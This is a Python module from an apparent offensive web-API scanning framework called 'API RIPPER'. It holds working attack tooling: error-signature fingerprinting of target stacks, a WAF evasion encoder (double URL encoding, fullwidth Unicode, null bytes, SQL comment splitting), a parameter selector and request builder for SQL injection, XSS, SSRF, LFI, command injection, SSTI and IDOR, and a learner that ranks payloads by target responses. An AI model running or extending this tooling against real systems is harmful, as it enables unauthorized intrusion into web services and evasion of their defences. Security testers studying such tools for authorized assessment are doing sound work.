"""
API RIPPER v2.0 — Adaptive Intelligence Engine
The brain that makes the framework think like a real attacker.

Contains:
  1. BehavioralFingerprinter — Infers tech stack from behavior, not just headers
  2. WAFEvasionEncoder — Encodes payloads to bypass WAFs
  3. SmartInjector — Injects into the RIGHT parameter in the RIGHT location
  4. PayloadLearner — Tracks what works and what doesn't per target
"""

import hashlib
import logging
import re
import random
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote, urlencode

logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════════
# 1. BEHAVIORAL FINGERPRINTER
#    Infers technology stack from error patterns, response structure,
#    default pages, and behavioral signatures — NOT just headers.
# ═══════════════════════════════════════════════════════════════

class BehavioralFingerprinter:
    """
    Detects technology stack from behavioral signals.
    Works even when headers are stripped by WAF/CDN.
    """

    # Error pattern → technology mapping
    ERROR_SIGNATURES = {
        # Python
        "Traceback (most recent call last)": {"language": "python", "confidence": 0.95},
        "django.core.exceptions": {"framework": "django", "language": "python", "confidence": 0.95},
        "flask.debughelpers": {"framework": "flask", "language": "python", "confidence": 0.95},
        "werkzeug.exceptions": {"framework": "flask", "language": "python", "confidence": 0.9},
        "fastapi": {"framework": "fastapi", "language": "python", "confidence": 0.9},
        "pydantic.error_wrappers": {"framework": "fastapi", "language": "python", "confidence": 0.85},

        # PHP
        "Fatal error:": {"language": "php", "confidence": 0.9},
        "Parse error:": {"language": "php", "confidence": 0.9},
        "Warning: mysql_": {"language": "php", "db": "mysql", "confidence": 0.95},
        "Warning: pg_": {"language": "php", "db": "postgresql", "confidence": 0.95},
        "laravel": {"framework": "laravel", "language": "php", "confidence": 0.85},
        "symfony": {"framework": "symfony", "language": "php", "confidence": 0.85},

        # Java / Spring
        "java.lang.": {"language": "java", "confidence": 0.9},
        "javax.servlet": {"language": "java", "confidence": 0.9},
        "org.springframework": {"framework": "spring", "language": "java", "confidence": 0.95},
        "Whitelabel Error Page": {"framework": "spring_boot", "language": "java", "confidence": 0.95},
        "at org.apache.tomcat": {"server": "tomcat", "language": "java", "confidence": 0.9},

        # .NET / ASP
        "System.Web.HttpException": {"language": "dotnet", "confidence": 0.9},
        "ASP.NET": {"framework": "aspnet", "language": "dotnet", "confidence": 0.95},
        "Server Error in '/' Application": {"framework": "aspnet", "language": "dotnet", "confidence": 0.9},
        "Microsoft.AspNetCore": {"framework": "aspnet_core", "language": "dotnet", "confidence": 0.95},

        # Node.js / Express
        "ReferenceError:": {"language": "nodejs", "confidence": 0.7},
        "TypeError:": {"language": "nodejs", "confidence": 0.5},
        "at Object.<anonymous>": {"language": "nodejs", "confidence": 0.8},
        "Cannot GET /": {"framework": "express", "language": "nodejs", "confidence": 0.85},
        "express deprecated": {"framework": "express", "language": "nodejs", "confidence": 0.9},

        # Ruby / Rails
        "ActionController::RoutingError": {"framework": "rails", "language": "ruby", "confidence": 0.95},
        "ActiveRecord::": {"framework": "rails", "language": "ruby", "confidence": 0.9},

        # Database-specific
        "You have an error in your SQL syntax": {"db": "mysql", "confidence": 0.95},
        "ORA-": {"db": "oracle", "confidence": 0.9},
        "PG::": {"db": "postgresql", "confidence": 0.9},
        "SQLSTATE": {"db": "sql_generic", "confidence": 0.8},
        "MongoDB": {"db": "mongodb", "confidence": 0.9},
        "CastError": {"db": "mongodb", "confidence": 0.75},
    }

    # Response structure patterns
    STRUCTURE_SIGNATURES = {
        "application/json": [
            ('"error":', {"api_style": "rest"}),
            ('"errors":', {"api_style": "graphql"}),
            ('"data":', {"api_style": "graphql"}),
            ('"message":', {"api_style": "rest"}),
            ('"detail":', {"framework": "fastapi", "language": "python"}),
            ('"status_code":', {"framework": "fastapi", "language": "python"}),
        ],
    }

    def __init__(self):
        self.detections: Dict[str, Any] = {}
        self.confidence_scores: Dict[str, float] = {}

    def analyze_response(self, status: int, headers: Dict, body: str) -> Dict[str, Any]:
        """Analyze a single response for technology signals."""
        findings = {}

        # 1. Error pattern matching
        for pattern, tech_info in self.ERROR_SIGNATURES.items():
            if pattern.lower() in body.lower():
                conf = tech_info.get("confidence", 0.5)
                for key, val in tech_info.items():
                    if key != "confidence":
                        existing_conf = self.confidence_scores.get(key, 0)
                        if conf > existing_conf:
                            self.detections[key] = val
                            self.confidence_scores[key] = conf
                            findings[key] = val

        # 2. Default error page detection
        if status == 404:
            if "nginx" in body.lower():
                self._update("server", "nginx", 0.8)
            elif "apache" in body.lower():
                self._update("server", "apache", 0.8)
            elif "iis" in body.lower() or "microsoft" in body.lower():
                self._update("server", "iis", 0.8)

        # 3. Cookie-based detection
        cookie_header = headers.get("set-cookie", "")
        if "PHPSESSID" in cookie_header:
            self._update("language", "php", 0.9)
        elif "JSESSIONID" in cookie_header:
            self._update("language", "java", 0.9)
        elif "ASP.NET_SessionId" in cookie_header:
            self._update("language", "dotnet", 0.9)
        elif "connect.sid" in cookie_header:
            self._update("language", "nodejs", 0.85)
        elif "csrftoken" in cookie_header or "sessionid" in cookie_header:
            self._update("framework", "django", 0.7)
        elif "_rails" in cookie_header:
            self._update("framework", "rails", 0.8)

        # 4. Header-based behavioral detection
        x_powered = headers.get("x-powered-by", "").lower()
        if "php" in x_powered:
            self._update("language", "php", 0.9)
        elif "express" in x_powered:
            self._update("framework", "express", 0.9)
            self._update("language", "nodejs", 0.9)
        elif "asp.net" in x_powered:
            self._update("language", "dotnet", 0.9)

        return findings

    def _update(self, key: str, value: str, confidence: float):
        if confidence > self.confidence_scores.get(key, 0):
            self.detections[key] = value
            self.confidence_scores[key] = confidence

    def get_profile(self) -> Dict[str, Any]:
        """Get the accumulated technology profile."""
        return dict(self.detections)

    def get_db_type(self) -> str:
        """Get detected database type for targeted SQLi payloads."""
        return self.detections.get("db", "sql_generic")

    def get_language(self) -> str:
        return self.detections.get("language", "unknown")

    def get_framework(self) -> str:
        return self.detections.get("framework", "unknown")


# ═══════════════════════════════════════════════════════════════
# 2. WAF EVASION ENCODER
#    Applies encoding transformations to bypass WAF pattern matching.
# ═══════════════════════════════════════════════════════════════

class WAFEvasionEncoder:
    """
    Generates encoded variants of payloads to bypass WAF rules.
    Each method returns a transformed version of the payload.
    """

    @staticmethod
    def get_variants(payload: str, max_variants: int = 5) -> List[str]:
        """Generate multiple encoded variants of a payload."""
        variants = [payload]  # Always include original

        encoders = [
            WAFEvasionEncoder.url_encode,
            WAFEvasionEncoder.double_url_encode,
            WAFEvasionEncoder.unicode_encode,
            WAFEvasionEncoder.case_swap,
            WAFEvasionEncoder.null_byte_insert,
            WAFEvasionEncoder.comment_insert_sql,
            WAFEvasionEncoder.concat_split,
        ]

        random.shuffle(encoders)
        for encoder in encoders[:max_variants - 1]:
            try:
                variant = encoder(payload)
                if variant and variant != payload and variant not in variants:
                    variants.append(variant)
            except Exception:
                pass

        return variants[:max_variants]

    @staticmethod
    def url_encode(payload: str) -> str:
        """URL-encode special characters."""
        return quote(payload, safe='')

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL-encode to bypass WAFs that decode once."""
        return quote(quote(payload, safe=''), safe='')

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Replace ASCII with Unicode fullwidth equivalents."""
        result = []
        for c in payload:
            if 'A' <= c <= 'Z':
                result.append(chr(0xFF21 + ord(c) - ord('A')))
            elif 'a' <= c <= 'z':
                result.append(chr(0xFF41 + ord(c) - ord('a')))
            elif c == '<':
                result.append('＜')
            elif c == '>':
                result.append('＞')
            elif c == "'":
                result.append('＇')
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def case_swap(payload: str) -> str:
        """Random case swap for SQL keywords."""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT',
                     'UPDATE', 'DELETE', 'DROP', 'SLEEP', 'WAITFOR', 'BENCHMARK',
                     'ORDER', 'GROUP', 'HAVING', 'LIMIT', 'NULL', 'TRUE', 'FALSE']
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                swapped = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in kw)
                result = re.sub(re.escape(kw), swapped, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def null_byte_insert(payload: str) -> str:
        """Insert null bytes to confuse parsers."""
        return payload.replace(" ", "%00 ").replace("=", "%00=")

    @staticmethod
    def comment_insert_sql(payload: str) -> str:
        """Insert SQL comments between keywords to bypass pattern matching."""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'SLEEP', 'WAITFOR']
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                commented = '/**/'.join(list(kw))
                result = re.sub(re.escape(kw), commented, result, count=1, flags=re.IGNORECASE)
        return result

    @staticmethod
    def concat_split(payload: str) -> str:
        """Split string literals using database concatenation."""
        # For SQL: 'admin' → 'ad'||'min' (Oracle/Postgres) or 'ad'+'min' (MSSQL)
        if "'" in payload:
            parts = payload.split("'")
            if len(parts) >= 3:
                inner = parts[1]
                if len(inner) > 2:
                    mid = len(inner) // 2
                    return payload.replace(f"'{inner}'", f"'{inner[:mid]}'||'{inner[mid:]}'")
        return payload


# ═══════════════════════════════════════════════════════════════
# 3. SMART INJECTOR
#    Injects payloads into the correct parameter at the correct
#    location (query, body, JSON, header, path, cookie).
# ═══════════════════════════════════════════════════════════════

class SmartInjector:
    """
    Generates injection requests using discovered parameters
    from the Knowledge Graph instead of hardcoded 'id'.
    """

    # Parameter names that are high-value injection targets by category
    PARAM_PRIORITIES = {
        "sqli": ["id", "user_id", "uid", "order_id", "item_id", "product_id", "category",
                 "search", "query", "q", "filter", "sort", "order", "page", "limit",
                 "username", "email", "name", "where", "columns"],
        "xss": ["q", "query", "search", "name", "title", "comment", "message",
                "text", "body", "content", "description", "value", "input", "callback",
                "redirect", "url", "next", "return", "returnUrl"],
        "ssrf": ["url", "uri", "link", "href", "src", "source", "target", "dest",
                 "destination", "redirect", "next", "return", "callback", "webhook",
                 "proxy", "feed", "image", "img", "file", "path", "page", "load"],
        "lfi": ["file", "path", "template", "page", "include", "dir", "document",
                "folder", "root", "pg", "style", "pdf", "img", "filename", "filepath"],
        "cmd": ["cmd", "command", "exec", "execute", "run", "system", "ping",
                "query", "jump", "code", "reg", "do", "func", "arg", "option",
                "process", "step", "read", "feature", "exe", "module", "payload",
                "cli", "daemon", "upload"],
        "ssti": ["template", "preview", "id", "view", "activity", "name", "content",
                 "redirect", "page", "url", "q", "search", "lang"],
        "idor": ["id", "user_id", "uid", "account_id", "profile_id", "order_id",
                 "doc_id", "item_id", "no", "number", "key", "ref"],
        "open_redirect": ["url", "redirect", "next", "return", "returnUrl", "goto",
                          "destination", "redir", "redirect_uri", "continue", "target"],
    }

    @staticmethod
    def get_injection_targets(endpoint_data: Dict, vuln_type: str) -> List[Dict]:
        """
        Get the best parameters to inject into for a given vulnerability type.
        Uses KG endpoint data (params, methods) to make intelligent decisions.
        
        Returns: [{"param": "name", "location": "query|body|path|header", "method": "GET|POST"}]
        """
        targets = []
        params = endpoint_data.get("parameters", {})
        url = endpoint_data.get("url", "")
        methods = endpoint_data.get("methods", ["GET"])

        priority_names = SmartInjector.PARAM_PRIORITIES.get(vuln_type, ["id"])

        # 1. Use discovered parameters from KG
        for param_name, param_info in params.items():
            location = param_info.get("location", "query")
            param_type = param_info.get("type", "string")
            priority = 0

            # Boost priority if param name matches the vuln type's target list
            if param_name.lower() in [p.lower() for p in priority_names]:
                priority = 10
            elif any(pn in param_name.lower() for pn in priority_names):
                priority = 5

            targets.append({
                "param": param_name,
                "location": location,
                "method": methods[0] if methods else "GET",
                "type": param_type,
                "priority": priority,
            })

        # 2. If no KG params, generate synthetic targets from priority list
        if not targets:
            for param_name in priority_names[:5]:
                targets.append({
                    "param": param_name,
                    "location": "query",
                    "method": methods[0] if methods else "GET",
                    "type": "string",
                    "priority": 3,
                })

        # 3. Add path-based injection if URL has segments with IDs
        if re.search(r'/\d+', url) or re.search(r'/[a-f0-9-]{36}', url):
            targets.append({
                "param": "__path_id__",
                "location": "path",
                "method": methods[0] if methods else "GET",
                "type": "id",
                "priority": 8,
            })

        # Sort by priority (highest first)
        targets.sort(key=lambda t: t.get("priority", 0), reverse=True)
        return targets[:10]  # Max 10 injection targets

    @staticmethod
    def build_request(endpoint_url: str, target: Dict, payload: str) -> Dict:
        """
        Build a complete request specification for a given injection target.
        Returns: {"method": str, "url": str, "headers": dict, "body": str, "content_type": str}
        """
        method = target.get("method", "GET")
        param = target.get("param", "id")
        location = target.get("location", "query")

        request = {"method": method, "url": endpoint_url, "headers": {}, "body": None, "content_type": None}

        if location == "query":
            sep = "&" if "?" in endpoint_url else "?"
            request["url"] = f"{endpoint_url}{sep}{param}={payload}"

        elif location == "body":
            request["method"] = "POST" if method == "GET" else method
            request["body"] = f"{param}={payload}"
            request["content_type"] = "application/x-www-form-urlencoded"

        elif location == "json":
            import json
            request["method"] = "POST" if method == "GET" else method
            request["body"] = json.dumps({param: payload})
            request["content_type"] = "application/json"

        elif location == "header":
            request["headers"][param] = payload

        elif location == "path":
            # Replace numeric path segments with payload
            request["url"] = re.sub(r'/(\d+)(?=[/?#]|$)', f'/{payload}', endpoint_url, count=1)

        elif location == "cookie":
            request["headers"]["Cookie"] = f"{param}={payload}"

        return request


# ═══════════════════════════════════════════════════════════════
# 4. PAYLOAD LEARNER
#    Tracks payload effectiveness per target. Learns what works.
# ═══════════════════════════════════════════════════════════════

class PayloadLearner:
    """
    Tracks payload outcomes to avoid retrying dead payloads
    and to prioritize payloads that have shown partial success.
    """

    def __init__(self, knowledge_graph=None):
        self.kg = knowledge_graph
        self._success_scores: Dict[str, float] = {}  # payload_hash → score
        self._endpoint_dead: Dict[str, int] = {}  # endpoint → consecutive failures

    def payload_hash(self, payload: str) -> str:
        return hashlib.md5(str(payload).encode()).hexdigest()[:12]

    def record_result(self, endpoint: str, payload: str, status: int, body_preview: str = ""):
        """Record the outcome of a payload test."""
        ph = self.payload_hash(payload)

        # Categorize the result
        if status == 0:  # timeout/connection error
            score = -0.5
        elif status in (403, 406, 501):  # WAF/blocked
            score = -1.0
            if self.kg:
                self.kg.record_failed_payload(endpoint, ph)
        elif status == 404:
            score = -0.3
        elif status == 500:
            # 500 is interesting — it means the payload reached the backend
            score = 0.5
        elif status == 200:
            score = 0.3
        else:
            score = 0.0

        # Check for error disclosure in body (highly valuable)
        error_patterns = ["syntax error", "sql", "traceback", "exception", "stack trace", "error in"]
        if any(p in body_preview.lower() for p in error_patterns):
            score += 1.0

        self._success_scores[ph] = self._success_scores.get(ph, 0) + score

        # Track consecutive failures per endpoint
        if score < 0:
            self._endpoint_dead[endpoint] = self._endpoint_dead.get(endpoint, 0) + 1
        else:
            self._endpoint_dead[endpoint] = 0

    def should_skip_endpoint(self, endpoint: str, threshold: int = 15) -> bool:
        """Skip endpoints that consistently return errors (dead/hardened)."""
        return self._endpoint_dead.get(endpoint, 0) >= threshold

    def should_skip_payload(self, endpoint: str, payload: str) -> bool:
        """Skip payloads already proven dead at this endpoint."""
        if self.kg:
            return self.kg.is_payload_failed(endpoint, self.payload_hash(payload))
        return False

    def rank_payloads(self, payloads: List[str]) -> List[str]:
        """Rank payloads by historical success score (best first)."""
        scored = [(p, self._success_scores.get(self.payload_hash(p), 0)) for p in payloads]
        scored.sort(key=lambda x: x[1], reverse=True)
        return [p for p, s in scored]
